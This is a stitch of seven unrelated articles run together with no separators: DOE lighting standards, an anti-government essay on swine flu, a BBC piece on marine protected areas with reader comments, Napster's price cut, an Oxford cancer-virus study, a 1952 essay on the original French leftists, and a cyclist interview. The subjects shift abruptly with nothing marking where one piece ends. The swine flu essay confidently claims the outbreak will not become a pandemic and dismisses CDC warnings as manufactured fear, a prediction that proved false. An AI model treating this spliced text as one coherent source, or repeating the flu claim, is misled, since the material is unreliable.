Earlier this month , the DOE unveiled a major lighting - efficiency standard aimed at two types of bulbs : the ubiquitous four - foot and eight - foot fluorescent tubes common in many offices ; and incandescent reflector lamps , the cone - shaped bulbs that fit in recessed ceiling fixtures .
DOE estimates that the new lighting rule could save consumers almost $ 40 billion between 2012 and 2042 and eliminate the need for up to 3,850 megawatts of power - generating capacity .
“ These new appliance standards are not a silver bullet ; they wo n’t get you all the way there , ” Mr. deLaski says .
“ But they do represent a historic opportunity for very large energy and dollar savings .... ”
One key will be whether the standards are tough enough .
By law , the DOE must reset appliance standards every few years at the maximum level that is economically justified and technologically feasible .
The Bush administration ’s residential furnace standards were seen as unduly weak by states and environmental groups , which sued to block standards that could already be met by 99 percent of the furnaces on the market , deLaski says .
“ We ’re optimistic the [ Obama ] administration will revisit what we think was a lousy decision , ” he says .
Likewise , he anticipates that the DOE will beef up standards for appliances such as commercial clothes washers .
Until recently , DOE had proposed separate standards for top- loading and front - loading machines .
That could allow manufacturers of less - efficient top- loading machines to maintain or even increase market share , deLaski says .
Appliance manufacturers at times have declared that tougher standards were too costly for industry and consumers .
Kyle Pitsor , vice president of government relations for the National Electrical Manufacturers Association , an industry group , says efficiency gains can be wrung out of products , but sometimes with difficulty and at higher cost .
Osram Sylvania already sells premium - priced fluorescent bulbs that meet the highest possible standard DOE might soon implement .
But some company officials say the toughest standard being weighed for fluorescent tube lights is not the most appropriate .
“ One concern we have is that legislators are listening to all the press releases about what future technology can do , but not paying attention to real life , ” says Susan Anderson , energy relations manager for Osram Sylvania .
Many residential customers , she notes , have older fluorescent fixtures that are incompatible with high - efficiency bulbs , so the toughest standard would force homeowners to replace not just bulbs , but fixtures as well .
Technology experts at Sylvania say they can make lighting more efficient but that technical hurdles are getting higher .
“ We ’re reaching the limit in gaining savings from the lamp alone , ” says Martin Zachau , vice president of research and development .
“ A lot of future potential energy savings is really more in the electronics than the lamp itself .
It ’s a growing challenge . ”
But the spate of tougher appliance standards are needed to help the US deal with its energy challenges without breaking the bank , says Steven Nadel , executive director of the American Council for an Energy - Efficient Economy .
Efficiency policies are “ a key strategy for keeping the cost of climate change legislation to modest levels . ”

Wherever one turns , whether it is on the broadcast news or the Internet , we are bombarded with Swine Flu stories .
Government tells us not to " panic , " while it simultaneously engages in activities meant to spread widespread fear .
Indeed , as Robert Higgs has written , the very basis of government rests upon cultivating human fear :
The people who have the effrontery to rule us , who call themselves our government , understand this basic fact of human nature ( about fear ) .
They exploit it , and they cultivate it .
Whether they compose a warfare state or a welfare state , they depend on it to secure popular submission , compliance with official dictates , and , on some occasions , affirmative cooperation with the state ’s enterprises and adventures .
Without popular fear , no government could endure more than twenty - four hours .
David
Hume taught that all government rests on public opinion , but that opinion , I maintain , is not the bedrock of government .
Public opinion itself rests on something deeper : fear .
If one wishes to " test " Professor Higgs ’ proposition , one needs to look no further than the actions of the Centers for Disease Control , which claims to be in a constant state of readiness in order to protect us from the next pandemic .
At the CDC , it always is 1918 , and an outbreak of " Spanish Flu " or something like it is just around the corner .
A visit to the CDC ’s website shows that the CDC has placed the latest outbreak of Swine Flu front - and - center .
News reports monitor the every word of the CDC " experts " who are bombarded with questions about whether or not this is the " Big One . "
My sense is that the " experts , " the media , and everyone else in the Flu chain will be disappointed when this turns out to be another overblown " crisis " that governments have foisted upon us right - and - left .
One must remember that for many years , the CDC has been creating vast emergency " plans " that are supposed to swing into action the minute that a rumor is afloat that someone , somewhere , has the flu .
Politicians and media figures also want a cut of the action and make sure that they keep the issue before us , telling us " what we need to know . "
Actually , what we need to know is that government is the last thing we need in our faces if there is a real pandemic .
That is because governments played a major role in creating the conditions that turned the " Spanish Flu " situation of 1918 into a world - wide tragedy that led to the death of millions .
If government is to trot out its " war emergency " model as the way to " protect " us from the flu , perhaps we need to be reminded of how well that model works — in making sure lots of people become sick and die .
Most people do n’t remember 1918 as the year the flu pandemic began ; they remember it as the year that World War I ended .
This was the " War to End All Wars , " or so it was called , when a more appropriate title might have been the " War to Permanently Expand the State . "
More than 10 million soldiers died on the battlefields of Europe and millions of civilians died deaths of starvation or were killed in the crossfire .
Since war is a tool of the state , we safely and honestly can say that the calamities of World War I were state - created .
Unfortunately , people did not just die from bullets , artillery shells , bombs , and even starvation .
Across the globe , the war resulted in vast swaths of malnourishment as crops were diverted from civilian populations to the huge armies strung across Europe .
At the same time , once - productive croplands in Europe were reduced to moonscapes as the armies obliterated the land .
But governments were not satisfied with the sheer amount of physical and human destruction .
Indeed , the government made things worse through lies , and nowhere was that more apparent that the lies told by state agents in order to " prevent panic " from the onrushing flu epidemic .
As Wikipedia points out :
The Great Influenza was the source of much fear in citizens around the world .
Further inflaming that fear was the fact that governments and health officials were downplaying the influenza .
While the panic from World War I was dwindling , governments attempted to keep morale up by spreading lies and dismissing the influenza .
On September 11 , 1918 , Washington officials reported that the Spanish Influenza had arrived in the city .
The following day , roughly thirteen million men across the country lined up to register for the war draft , providing the influenza with an efficient way to spread .
However , the influenza had little impact upon institutions and organizations .
While medical scientists did rapidly attempt to discover a cure or vaccine , there were virtually no changes in the government or corporations .
Additionally , the political and military events were fairly unaffected due to the impartiality of the disease , which affected both sides alike .
Exacerbating the crisis in this country was the crowding of American troops onto ships following the war ’s end , which was guaranteed to spread the sickness and help it spread when the soldiers reached the USA .
On the home front , huge war bond rallies in large cities brought people into very close proximity with each other , allowing the flu to spread rapidly .
On one end , the government helped to create the conditions that spread the flu ; on the other hand , agents representing the state lied about those conditions .
By the war ’s end , Germany was near starvation ( and many people did starve to death during the British blockade that lasted well into 1919 ) , and about a half - million civilians succumbed to the sickness in that country .
It is estimated that 16 million people in India died of the pandemic .
Yet , when it raises the prospect of a repeat of this very horror , governments engage in more lies .
We forget that life expectancy in the United States was in the mid-50s for white males and less than 50 for black men .
In countries elsewhere , and especially in Asia and Africa , life expectancy was much shorter .
Medical care at that time was primitive compared to what we have today , even in poor countries , and it was not uncommon in that era for people to be exposed to epidemics that pretty much have disappeared today .
Even with those odds , the mortality rate during the 1918 — 1920 pandemic was estimated at between 2.5 and 5 percent .
We can be assured today that not only would fewer people become sick , but even fewer people would die .
In other words , even at its worst , the current outbreak of Swine Flu , while bad , is not going to turn into a pandemic no matter what CNN and the CDC try to tell us .
We supposedly live in an age of " enlightened " government , yet governments in 1918 allegedly were " enlightened , " too , and that was at the height of the " Progressive Era . "
The real problem , however , was that those " enlightened " governments had created the very conditions that served as the tinderbox to ignite this pandemic .
If anything , governments today seek to restrict human freedom even more so than did governments of that era , as bad as they were .
President Obama , like his predecessor , would have no problem grabbing " emergency " powers in order to fight this supposed onslaught of disease .
Emergency plans hatched in the bowels of the CDC bureaucracy await implementation , which would release the inner dictator that resides in the hearts of thousands of bureaucrats across the country .

VIEWPOINT
Erich Hoyt
As the world marks the first UN Oceans Day , marine scientist Erich Hoyt says too little of the oceans has been set aside to protect marine life .
In this week 's Green Room , he explains why vast protected areas are needed to ensure the long term survival of marine mammals such as whales and dolphins .
If we can make homes for whales and dolphins , the ocean may just have a chance
Where do whales live ?
In the sea , of course ; but the sea is ever changing .
We know that sperm whales search for squid in the dark canyons off the continental shelf .
We know that other whales and dolphins feed along massive seasonal upwellings fuelled by plankton explosions that attract vast schools of fish , which in turn attract seabirds , sharks and turtles , too .
We know that whales travel from feeding areas near the Arctic and Antarctic to warm equatorial regions where they breed and raise their calves .
So where precisely do whales live ?
Well , this is the starting point for marine habitat - related research on whales and dolphins .
We are still in the process of determining the fine points based on ocean depth , slope , temperature , currents and other factors ; but we are learning .
And the more we learn , the more we realise how important it is to know where everything lives and how it functions in the dynamic environment of the sea ; not just whales and dolphins but all marine life .
Habitats for a lifetime Since the 1960s ' save - the - whale movement started in California , we have made some progress reversing the momentum toward extinction that came from centuries of whaling .
Despite global campaigns , whale meat is still sold in a number of nations
There are still great threats to whales and dolphins as some countries continue to go whaling and dolphin hunting .
Hundreds of thousands of whales and dolphins are killed every year as bycatch and as a result of becoming tangled in fishing gear .
Also , overfishing has damaged ecosystems and food chains ; the escalating noise in the sea from shipping , military sonar and hydrocarbon exploration has invaded their habitats .
On top of all this , there is the silent kill from chemical pollution and the effects of climate change .
Meanwhile , oil , gas and mining industries have their sights set on the vast ocean seabed .
If the lessons of intensification during the previous century show us anything , it is that we need to make a place in the sea for marine life .
We cannot save the whales unless we save their habitat .
Thinking big International agreements , such as the Convention on Biological Diversity ( CBD ) , have set a looming deadline of 2012 to create a network of worldwide marine protection areas ( MPAs ) in national waters and on the high seas .
US vows ' huge ' marine protection Most countries have agreed to these targets yet few are on track to reach them .
In the UK , the parliaments in Westminster and Edinburgh are currently considering new marine bills that will determine the future extent of efforts to protect the sea around the British Isles .
Compared to land - based protected areas , which cover an estimated 12 % of the world 's continents and islands , protection of the sea stands at only 0.65 % , with highly protected areas limited to just 0.08 % .
Countries such as Australia , the US , and Kiribati are currently leading the world in marine protection , even if they too clearly have a long way to go in terms of full implementation .
Better understanding Whales and dolphins have colonised many marine habitats , and have intricate relationships with many other species .
With so many species and habitats , how can we uncover the key places where whales live , the critical areas needing protection ?
The past 35 years of research tell us that the same whales are returning to the same places to feed , mate , give birth , raise their calves and socialise .
Mothers have calves and then travel with them , introducing them to their favourite spots , corresponding to ideal depths , water temperatures , currents and other conditions for nursing , resting , finding prey , and so forth .
If marine mammals are turning up on beaches or dying in nets , then these events should be warning flags for the whole ecosystem
This is the concept of site fidelity .
How do we know this ?
Individuals within the various species of whales and dolphins can be distinguished by nicks or other markings on their fins and tails , or by pigmentation differences revealed by sharp photographs .
Thus , the animals can be named and distinguished , and therefore identified when re-sighted .
These re-sightings have helped us reveal site fidelity as well as abundance , crucial to telling us that one area is more important than another .
To protect these favourite places we must establish legally binding MPAs .
We must create management bodies and plans , and ensure there are provisions for enforcement and monitoring .
MPAs must be much larger than land - based protected areas because of the fluid nature of the ocean and the mobile nature of its inhabitants ; in some areas we may need flexible or moveable boundaries with seasonal components .
To help advance the creation of MPAs , we devised the idea of " homes for whales and dolphins " .
The great bonus is that by focusing on " homes " or safe havens for whales , we can protect much more .
Whales and dolphins are umbrella species .
The size of habitats needed for their protection , including consideration of MPA networks across ocean basins , will give assistance to many other species as well .
The goal , if not yet the practice , of most marine conservation revolves around the concept of ecosystem based management ; so theoretically , entire ecosystems could be protected .
Whales and dolphins are sentinel species .
If they are present and healthy , there is a good chance that the entire ecosystem is healthy .
Many cetaceans are among the apex predator species first to go from an area if things are not right , so if we can protect whales and dolphins , we know we are on the right road .
If marine mammals are turning up on beaches or dying in nets , then these events should be warning flags for the whole ecosystem .
The lines are being drawn in the sea .
Now more than ever we need a bold vision - big , ocean - wide networks of highly - protected areas .
Fifty years from now , we will see the present day as the time when we had a chance ; when we made tough choices and either elected to develop the sea , converting it into some vast watery industrial site , or decided to help significant portions of marine nature to stay wild and sustain our planet .
If we can make homes for whales and dolphins , the ocean may just have a chance .
Erich Hoyt is a research fellow and Critical Habitat / MPA Programme lead for the Whale and Dolphin Conservation Society
He is also the author of Marine Protected Areas for Whales , Dolphins and Porpoises ( Earthscan 2005 ) The Green Room is a series of opinion articles on environmental topics running weekly on the BBC News website Do you agree with Erich Hoyt ?
Is too little of the world 's oceans protected ?
Do whales ' migration patterns make it too difficult to protect the marine mammals ?
Is it asking too much to establish marine protection areas over vast areas needed to ensure the long term survival of whales and dolphins ?
Our thanks to the BBC for allowing an expert witness like Erich Hoyt to lay out the growing need for marine animal protection .
His detailed explanations and deep concerns , moderately stated , help alert all of us to press our governments to undertake initiatives in this vital area .
As humans we all love our oceans but are not well informed on what goes on within them .
The more we learn , from the BBC and caring custodians like Mr. Hoyt , the better our prospects of preserving our wonderful planet and its encircling seas .
Douglas Leiterman , Campbellville , Canada
The establishment of a network of marine protected areas is essential to ensure that our seas do not become lifeless bodies of water .
The whole marine ecosystem requires protecting in such areas , so there must be strong management plans in place to correctly balance the needs of the various marine species against man 's seemingly endless desire to strip the fish from the sea .
The tiny " no take zone " off the island of Lundy shows what can be achieved - an area that has an abundance of marine life now protected from any fishing .
However compare this to the Cardigan Bay Special Area of Conservation ( partly established in order to protect the resident bottlenose dolphins ) which is suffering decimation of the sea bed and the sea life that depends upon it , due to large scale scallop dredging being carried out ( all quite legally , although causing major concern even in the Welsh Assembly ) .
Would it not be an opportune time with the forthcoming meeting of environment ministers for the UN Climate Change Conference in Copenhagen in December , for countries to get together to address the issue of creating marine protected areas ; an issue that will become even more important with the effects that climate change will have on our seas ?
Lesley Frampton , Fareham , Hampshire , UK
We do have to treat our oceans with more respect , otherwise we wo n't have a future ... as Sylvia Earle said , the children of today are our last chance to teach what the oceans are all about ... the time is NOW .
See what we are going through here in Brazil with bomb fishing at www.cantoecologico.org
Carlos , Gabi e Mel , Cacha - Pregos - Bahia - Brazil
For those of us in the UK , we can ' act local ' andd support local community initiatives to establish such reserves .
Last year the Arran community , an island off the Scottish coast , successfully petitioned the establishment of a no - take zone in Lamlash Bay after 10 years of hard work .
One year later and efforts to bring it to fruition have ground to a halt as government has dragged its feet - no signs nor boundaries have been put up .
Trawlers have seen recently entering the area at night .
It was hoped that the establishment of the no-take zones would replenish stocks of fish and scallops after some species have all been disappeared .
Britain has its own potential Newfoundland on its doorstep .
Carolyn , Londong England I entirely agree .
More MPA 's are needed and they have to be large enough to safeguard essential habitat and migration corridors .
And they should be well managed with strict and enforced regulations .

The make up of the sea is like the content of our body .
When we forget to protect the life in the sea we cut the bond that brought us to be .
Dale Lanan , Longmont , Colorado , USA
There are too many people on the planet .
That 's the only problem we have .
The Trutherizer , Cape Town , South Africa Erich Hoyt has highlighted a very important point .
Creating and implementing proper ' marine protection areas ' are significant step in protecting marine life in national waters as well in the high seas .
Those who are killing marine life are dependent on marine life for their livelihood .
We need to identify and enrol them with some international registration and we need to involve them for the protection of the marine life .
With the kind of current technologies we posses for the surveillance , its not that difficult to ascertain right environment for the marine life protection provided you have enough desire to set aside your previous approach and to adopt a ' suitable common agenda ' .
New jobs may be created to maintain ' marine protection areas ' .
Substitute food alternatives must be identified .
And last but not the least is the check on growing human population is necessary .
Sanjay Singh
Thakur , Indore , India I agree entirely .
Marine protected areas can provide a much needed help to whales and dolphins .
Even more importantly , protecting whales and dolphins - well - known ' umbrella ' species - helps many other species that are part of the same ecosystem .
Giuseppe Notarbartolo - di-Sciara , Tethys Research Institute , Milano , Italy
We fully agree with Erich Hoyt !
Asking for marine protection areas is urgently needed for the survival of whales and dolphins .
Public awareness must urgently be rised .
The public living all along the seas must be better informed .
They are not aware of the damage they are causing with throwing their waste into the sea .
Owners of vessels , ferries , yachts etc should be shaken awake for not dropping their waste and especially their fuel into the seas .
Each one could help !
Katharina Heyer , Tarifa , Spain Dear BBC Editors :
Thanks for printing Mr. Hoyt 's thoughtful comment .
In many countries , even Canada , we look to your lead in reporting , using scorecards or other measures , to show how countries that sign international conventions live up to their pledges .
The marine protected areas are a hopeful approach in our time .
Sincerely , Peter Poole
Peter Poole , Banff , Canada Lately
I 've read a lot about chemical pollution affecting fish and marine mammals .
Why do n't we hear more about such effects in humans ( like the recent story concerning mutations and cancer in an industrial region of china ) .
Are we ( humans ) less at risk than sea creatures ?
Tom , pagosa springs CO USA Yes , I do agree with Erich Hoyt .
We need to consider carefully what he knows and tells us is needed to save the ocean and the creatures who dwell theren , and then ACT on that information .
There is no time to lose .
Marine Protected AReas ought to be number one on the list of any consideration concerning the health of the ocean and its inhabitants .
What Erich Hoyt is telling us is that the need for ocean habitat for its creatures has never been greater , and the time for us to do something about it is NOW , before it is too late .
Thank you for posting this most important piece of information .
We need to heed it .
Now .
DBL
Donna Balkan Litowitz , Miami Beach , Florida , USA
Well said .
The time for action is now .
Douglas hoffman , Kihei Hawaii usa Erich is correct .
In fact I would go further .
Be it the oceans or terra firma , we humans have no option but to learn to work with the natural world rather than constantly abusing it .
The seas are being trashed at an unprecedented rate and we have just a few years to mend our ways .
if just one major species is removed or greatly reduced in numbers then that effects the entire system , the environment is to a great degree a homogeneous mass and we are part of that system .
This especially applies to the oceans .
PETER JOHNSTON , EDMONTON CANADA
I totally agree .
if we treated are landscape like the way we treat the ocean , a big rubbish bin !
sparadic fighting would brake out in the streets !
the more we know about these mammals and their habbits the easyer it will be to protect them .
i fully support anything that will aid the survival of the oceans fragile eco system .
what can i do to help more ?
ian mccaldon , london
Yes , I fully agree with Erich Hoyt 's comments .
Unfortunately as over - fishing requires fishing vessels to search wider and further than ever , so the impingement on the habitats of the whales and dolpins becomes all the more severe .
In addition , there is also the impact of removing some species from the middle of the food hain ....
The world is shrinking and nowhere is inaccessible any longer , and unfortunately with that comes a price - potential damage to the ecosystems and their inhabitants .
We have just last week had 55 False Killer Whales stranded on a beach near Cape Town for no apparent reason - sad to think we are probably responsible for it .
Bruce See , Cape Town , South Africa
It is in all our interests to preserve more ocean areas .
This is one of the best ways to safeguard our whales and dolphins , but also to protect dwindling fish stocks .
MPAs become popular with the fishing industry once they discover that fish , when allowed to grow larger in MPAs , produce more eggs and thus can help to rebuild stocks .
Whales and dolphins face so many threats that interact in unknown ways , so the safest way to help them is to safeguard the whole ecosystem , or those critical areas they need to reproduce and feed .
We need to set aside special areas of the ocean NOW -- there 's not a moment to spare .
Well said , Erich .
Lindy Weilgart , Halifax , Canada
Thanks Erich for helping educate everyone on this important aspect !
Now let 's get everyone to DO SOMETHING ABOUT IT !!!
As CEO of MarinePositive , I challenge the BBC to " Go Blue Too " and would like to propose that a " Blue Room " is initiated to discuss the other 1/2 of the environment ( issues relative the the oceans , seas , and waters of the world ) because it is no longer just about going green !
Susannah Stewart , California
We shall stop , by all means , those new " super - sonar " systems that are used by western navies , if we intend to ensure whales and dolphins survival .
And that 's only a starter ...

“ Napster is back , ” said Eric Savitz in Barron’s .
Okay , it never truly went away , but new owner Best Buy has relaunched the music website with a cheaper , $ 5 - a - month service providing subscribers with five MP3 downloads and unlimited streaming of Napster ‘s 7 million songs .
It will be interesting to see whether the service catches on .
The price - cut — down from $ 13 a month — is “ a helluva deal for the real music lover , ” said Peter Burrows in BusinessWeek , but it wo n’t be enough to revive Napster .
“ This new Napster offering is only for use on your PC or laptop .
In this era of smart - phone mania , most people want to play their music wherever they want to play it . ”
Napster offers a $ 14.95 plan for downloading music to cell phones and other portable devices , said Saul Hansell in The New York Times , just “ not any that most people want to own . ”
But it ’s not alone — the whole industry has to get better at connecting to music lovers ’ cell phones if subscription music service is to survive .
At least Napster ’s new deal shows the “ music industry is becoming more flexible in its pricing . ”
Scientists at Oxford University have tamed a virus so that it attacks and destroys cancer cells but does not harm healthy cells .
They determined how to produce replication - competent viruses with key toxicities removed , providing a new platform for development of improved cancer treatments and better vaccines for a broad range of viral diseases .
Cellular microRNA molecules regulate the stability of mRNA in different cell types , and this newly - understood mechanism provides the possibility to engineer viruses for cell - specific inactivation .
Cancer Research UK scientists at the University of Oxford , United Kingdom , with support from colleagues at Vrije Universiteit , Amsterdam , report that this approach can be used to regulate proliferation of adenovirus .
Adenovirus is a DNA virus widely used in cancer therapy but which causes hepatic disease in mice .
Professor Len Seymour and colleagues found that introducing sites into the virus genome that are recognized by microRNA 122 leads to hepatic degradation of important viral mRNA , thereby diminishing the virus ' ability to adversely affect the liver , while maintaining its ability to replicate in and kill tumor cells .
Tumor - killing replicating viruses are a hot topic in the biotherapeutics arena , with many clinical trials ongoing worldwide .
That Professor Seymour 's group set out to and has now defined a mechanism whereby wild type virus potency could be maintained in tumor cells but the virus could be ' turned off ' in tissues vulnerable to pathology adds important information to the current base of knowledge .
" This approach is surprisingly effective and quite versatile .
It could find a range of applications in controlling the activity of therapeutic viruses , both for cancer research and also to engineer a new generation of conditionally - replicating vaccines , where the vaccine pathogen is disabled in its primary sites of toxicity , " Professor Seymour says .
The present study was intended mainly to explore and demonstrate the potential of this new mechanism to regulate virus activity .
Although the current tumor - killing virus is useful in mice , transfer of the technology into the clinical setting will require re-engineering of the virus to overcome virus pathologies seen in humans , and it will be at least two years before this can be tested in the clinics .
Modified naturally - occurring viruses have already had important uses in medicine including their use as vaccines , notably for measles , mumps , polio , influenza , and chicken pox .
They have already been developed as potential cancer - killing therapies , in an approach called virotherapy .

[ This essay appears in Essays on Liberty , ( volume 1 , 1952 ) . ]
The first leftist would not be popular in America today .
That is true because the original leftists wanted to abolish government controls over industry , trade , and the professions .
They wanted wages , prices , and profits to be determined by competition in a free market , and not by government decree .
They were pledged to free their economy from government planning , and to remove the government - guaranteed special privileges of guilds , unions , and associations whose members were banded together to use the law to set the price of their labor or capital or product above what it would be in a free market .
The first leftists were a group of newly elected representatives to the National Constituent Assembly at the beginning of the French Revolution in 1789 .
They were labeled " leftists " merely because they happened to sit on the left side in the French Assembly .
The legislators who sat on the right side were referred to as the party of the Right , or rightists .
The rightists or " reactionaries " stood for a highly centralized national government , special laws and privileges for unions and various other groups and classes , government economic monopolies in various necessities of life , and a continuation of government controls over prices , production , and distribution .
Early American Ideals
The ideals of the party of the Left were based largely on the spirit and principles of our own American Constitution .
Those first French leftists stood for individual freedom of choice and personal responsibility for one 's own welfare .
Their goal was a peaceful and legal limitation of the powers of the central government , a restoration of local self - government , an independent judiciary , and the abolition of special privileges .
Those leftists , holding a slim majority in the two years ' existence of the National Constituent Assembly , did a remarkable job .
They limited the extreme powers of the central government .
They removed special privileges that the government had granted to various groups and persons .
Their idea of personal liberty with absolute equality before the law for all persons was rapidly becoming a reality .
But before the program of those first leftists was completed , a violent minority from their own ranks — the revolutionary Jacobins — grasped the power of government and began their reign of terror and tyranny .
That development seems to have risen from this little - understood and dangerously deceptive arrangement : two groups of persons with entirely different motives may sometimes find themselves allied in what appears to be a common cause .
As proof that this danger is not understood even today , we need only examine the results of our own " common cause " alliances with various dictators against various other dictators .
So it was among the leftists in France in 1789 .
The larger faction wanted to limit the powers of government ; the leaders of the other group wanted to overthrow the existing rulers and grasp the power themselves .
Separation Of Powers
The majority of the original party of the Left had been opposed to concentrated power regardless of who exercised it .
But the violent revolutionists in their midst , led by Robespierre , Danton , and Marat , were opposed to concentrated power only so long as someone else exercised it .
Robespierre , who represented himself as spokesman for the people , first said that the division of the powers of government was a good thing when it diminished the authority of the king .
But when Robespierre himself became the leader , he claimed that the division of the powers of government would be a bad thing now that the power belonged " to the people . "
Thus , in the name of the people , the ideas of the original leftists were rejected .
For all practical purposes , local self - government disappeared completely , the independence of the judiciary was destroyed , and the new leaders became supreme .
The program of the first party of the Left was dead .
Most of the original leftists protested .
So they too were soon repudiated in the general terror that was called liberty .
But since the name leftist had become identified with the struggle of the individual against the tyranny of government , the new tyrants continued to use that good name for their own purposes .
This was a complete perversion of its former meaning .
Thus was born what should properly be called the new and second Left .
The leaders of this new Left were greatly aided in their program of deceiving the people by using this effective device of changing the meaning of words .
The term " tyranny " had been used to describe the powers of the old government .
And the term " liberty " had been used to describe the ideas of the original leftists .
Well and good .
But when the second leftists in turn became tyrannical , they continued to call it liberty !
In the name of liberty , mob violence was encouraged , habeas corpus was abolished , and the guillotine was set up !
Look Behind The Label
Now who is opposed to liberty or progress or any of the various other desirable ideals that government officials claim will result from their " unselfish programs for the people " ?
Probably no one .
Thus do the people tend to accept almost any idea — communism , socialism , imperialism , or whatever — if those ideas are advanced under attractive labels such as freedom from want , defense against aggression , welfare , equality , liberty , fellowship , and security .
Since most of the world today still suffers from this disease of " word confusion , " it is hardly surprising that the French people in the 1790s were also misled by the same device .
The rallying cry of this new Left was , All power to the people !
And , as always , it sounded good to the people .
But the point that the French people missed is the same point that haunts the world today .
It is this : the people cannot themselves individually exercise the power of government ; the power must be held by one or a few persons .
Those who hold the power always claim that they use it for the people , whether the form of government is a kingdom , a dictatorship , a democracy , or whatever .
If the people truly desire to retain or to regain their freedom , their attention should first be directed to the principle of limiting the power of government itself instead of merely demanding the right to vote on what party or person is to hold the power .
For is the victim of government power any the less deprived of his life , liberty , or property merely because the depriving is done in the name of — or even with the consent of — the majority of the people ?
It was on this point that Hitler , for instance , misled the Germans , and Stalin deceived the Russians .
Both of them hastened to identify themselves as champions of the people .
And there appears to be little or no doubt but that the majority of the people approved or acquiesced in the overall programs that were initiated in their names .
As the " leaders " murdered millions of individual persons , their excuse for their deeds was that they were doing them " for the people . "
As they enslaved countless millions of human beings , they brushed all criticism aside by exclaiming : " But the people voted for me in the last election . "
As they confiscated property and income , they claimed to be doing it " for the general welfare " and by " a mandate from the people . "
Hitler and Stalin merely adapted to their time and circumstances the philosophy of the French Jacobins , the new leftists , who declared that power is always too great in tyrannical hands , but that it can never be too great in the hands of the people — meaning Hitler , Stalin , a Jacobin leader , or any other person who wishes to possess and increase the power of government over the individual citizen .
What Is Government ?
Here is another illogical reason why the people of France traded the freedom - with - responsibility offered by the policy of the first leftists for the bloody tyranny offered by the policy of the second leftists :
They believed that an organized police force — government — could be used to force people to be good and virtuous .
" Since the name leftist had become identified with the struggle of the individual against the tyranny of government , the new tyrants continued to use that good name for their own purposes . "
It is true that this organized force of government can be used , and should be used , to restrain and punish persons who commit evil acts — murder , theft , defamation , and such — against their fellow men ; but this force that is government cannot be used to force persons to be good or brave or compassionate or charitable or virtuous in any respect .
All virtues must come from within a person ; they can not be imposed by force or threats of force .
Since that is so , it follows that almost all human relations and institutions should be left completely outside the authority of government , with no government regulation whatever .
But this seems to be a difficult idea for most persons to grasp .
The idea of concentrated government power — force against persons — is easy to grasp .
And it is easy to imagine that this power can be used to force equality upon unequal persons .
Possibly this explains why so many persons believe that the world could be near perfect if only they had the power of government to force other people to do what they think best for them .
That concept of government is , however , the direct road to despotism .
Any person who holds it is , by definition , a would - be dictator : one who desires to make mankind over in his own image — to force other persons to follow his concepts of morality , economics , social relationships , and government .
The fact that such would - be dictators may seem to have fine intentions , and wish only to do good for the people , does not justify their arrogant desire to have authority over others .
Thus it was that the terror of the second leftists reversed the advance of freedom that had begun in France in 1789 .
And the French Revolution finally became nothing more than a fight among would - be rulers to gain possession of the power of government .
The new leftists — as is the case with all persons who desire authority over other persons — did not fear the power of government .
They adored it .
Like Hitler , Stalin , and other despots , their primary reason for inciting the people to reject the old order was to get this power for themselves .
And the people did not object at first because they did not understand that the power of government is dangerous in any hands .
They just thought that it was dangerous in the hands of a king .
So they took the power from the king and transferred it to a " leader . "
They failed to see that it was a brutal restoration of the very thing they had rebelled against !
In fact , those second leftists held far more power than Louis XVI ever had .
" The French Revolution finally became nothing more than a fight among would - be rulers to gain possession of the power of government . "
Is there a lesson for present - day America to be learned from this French experiment with a highly centralized " people 's government " ?
The majority of the American people voted approval of this " Robespierre philosophy of government " as expressed by the holder of a high political office in 1936 :
[ I ]n 34 months we have built up new instruments of public power .
In the hands of a people 's government this power is wholesome and proper .
But in the hands of political puppets of an economic autocracy , such power would provide shackles for the liberties of the people .
When translated into simple English , that statement reads , power is a good thing , so long as I am the one who has it .
That concept of increasing the power of the national government seems to have even more support today , by the leaders of both major political parties , than it had in 1936 .
All of them claim , of course , that they will use the power " for the good of the people . "
Something For Nothing
Have we fully considered where this road may lead ?
Have we forgotten the teachings of our forefathers and their warning that the only hope for permanent liberty lies in restricting the power of government itself , regardless of who the government officials are or how they may be selected ?
Have we forgotten their warning to be especially wary of the demagogues who promise us something for nothing ?
Our founding fathers , along with the first leftists who were of the same political faith , were well aware that individual freedom and personal responsibility for one 's own welfare are equal and inseparable parts of the same truth .
They knew that history amply supports this truism : when personal responsibility is lost — whether it be taken by force or given up voluntarily — individual freedom does not long endure .
May 11/09 21:14 pm - Svein Tuft Interview
Posted by Editor on 05/11/09
Svein Tuft had a stellar 2008 , finishing seventh at the Olympics in the time trial and then taking the silver medal in that same event at the World Championships .
He then stepped up from the Continental Symmetric squad to the ProTour ranks with Garmin - Slipstream .
With Garmin - Slipstream he started the season at the Tour of California , where things were going well until a crash in the final stage , which included hitting his head .
Since then , he has raced sporadically while overcoming the effects of his crash , and was pulled last week from the Giro d'Italia squad ( however , he is still on the preliminary list for the Tour de France ) .
We spoke with Svein from his European base in Girona , Spain , where he shares an apartment with team mate Christian Meier ( and is in the same building as team mate Ryder Hesjedal ) .
Canadian Cyclist : So how is life in Girona ?
Svein Tuft :
It 's beautiful ; 29 degrees [ Celcius ] today .
I was out riding with Christian today , a monstrous climb .
I 've been loading for the last two weeks .
It was a hard load , six hours with 10,000 feet of climbing , just to get back on track .
CC : This crash at the Tour of California seems to have really affected your season .
What did it do to you ?
ST : It was really weird .
I am sure that I have been hit before , but I 've never had this kind of reaction .
It has been hard to deal with .
I felt like I was in a fog , really out of it .
After the Tour of California I came home [ to Vancouver ] for two days before going to Europe .
Since then , I have been spaced out , really slow reactions and balance problems .
But it was hard to quantify .
CC : And now ?
ST : It 's not until now , the last week or so that I 'm really snapping out of it .
The team doctors checked everything out , but everyone 's different , and I 've discovered that no one really knows a lot about this sort of stuff .
You just have to give it time .
It has been tough sometimes ; I 've wondered if I was making it up .
I was on for all the Classics , but things did n't start to come around until the Three Days [ of De Panne ] .
Then I had my next accident !
I hit a concrete flower box and hurt my knee and my back .
It did n't seem too bad to start , but then the day after Flanders I could n't pedal .
I was supposed to do Roubaix , but instead I came home and pretty much shut it down and tried to get back on top of things .
CC : Did that work ?
ST : The last week and a half has been awesome .
I have a friend visiting who is an acupuncturist , and that has made a big difference as well .
It feels like I am really back on top of it finally .
I guess I 've been really luck , but it 's been hard on the head .
CC : So now that you are n't doing the Giro , what 's your schedule ?
ST : [ Volta Ciclista a ] Catalunya and then either Dauphine [ Libere ] or Tour de Suisse .
CC : And what about the Tour [ de France ] ?
ST : Yeah , I think that 's what the team wants for me , and it 's looking solid , very positive .
CC : Now , you 've gone from being on a North American team , on the continental circuit , to what is really the Premier League of cycling .
That 's a big step .
What are you seeing as the most noticeable differences ?
ST : Well , when you do a Classics - style race , like De Panne , it 's like doing a Flanders every day .
